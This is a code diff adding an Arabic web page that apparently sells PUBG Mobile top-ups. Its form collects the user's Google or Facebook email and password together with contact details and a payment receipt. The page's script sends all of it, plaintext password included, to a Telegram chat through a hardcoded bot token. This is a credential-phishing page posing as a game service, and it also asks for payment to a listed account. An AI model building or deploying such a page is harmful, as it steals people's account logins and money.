@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن بوبجي موبايل بالحساب</title>
+    <style>
+        body { background-color: #FF4500; font-family: Arial, sans-serif; text-align: center; }
+        .shipping-form { width: 80%; max-width: 600px; padding: 20px; background-color: white; margin: auto; border-radius: 10px; }
+        input, select, button { width: 100%; padding: 10px; margin: 5px 0; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <div class="shipping-form">
+        <h2>شحن بوبجي  بالحساب</h2>
+        <img src="bubg.jpg" width="120">
+        <input type="text" id="name" placeholder="الاسم الكامل" required>
+        <input type="text" id="whatsapp" placeholder="رقم الواتساب" required>
+        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+        <label>نوع الحساب:</label>
+        <select id="accountType">
+            <option value="google">جوجل</option>
+            <option value="facebook">فيسبوك</option>
+        </select>
+        <input type="text" id="accountEmail" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
+        <h3>الدفع </h3>
+        <a href="#3ff" class="mp"> <button> ارقام حساباتنا</button></a>
+       
+        <input type="number" id="transactionNumber" placeholder="رقم عملية التحويل" required>
+        <input type="file" id="uploadImage" accept="image/*">
+        <button onclick="submitForm()">إرسال</button>
+    </div>
+<div id="3ff">
+        <h4>بنكك </h4>
+        <h4>ماي كاشي 687216</h4>
+    </div>
+    <script>
+        function submitForm() {
+            const name = document.getElementById("name").value;
+            const whatsapp = document.getElementById("whatsapp").value;
+            const email = document.getElementById("email").value;
+            const accountType = document.getElementById("accountType").value;
+            const accountEmail = document.getElementById("accountEmail").value;
+            const password = document.getElementById("password").value;
+            const transactionNumber = document.getElementById("transactionNumber").value;
+            const imageInput = document.getElementById("uploadImage").files[0];
+
+            const message = `🔥    شحن بوبجي بالحساب   🔥\n\n👤 الاسم: ${name}\n📞 رقم الواتساب: ${whatsapp}\n📧 البريد الإلكتروني: ${email}\n🔹 نوع الحساب: ${accountType}\n📌 بيانات الحساب: ${accountEmail} | ${password}\n💳 رقم التحويل: ${transactionNumber}`;
+
+            const botToken = "7897122987:AAEutcCTuehzpvUGUhGWT773tCLVm8brplU";
+            const chatId = "7172098832";
+
+            if (imageInput) {
+                const formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("photo", imageInput);
+                formData.append("caption", message);
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData })
+                    .then(() => alert(" تم الإرسال بنجاح الطلب يستغرق 15 - 20 دقيقة! [سيتم ارسال  رسالة تأكيد في رقم الواتساب ]"))
+                    .catch(() => alert(" في الاتصال حدث خطأ❌!"));
+            }
+        }
+    </script>
+</body>
+</html>
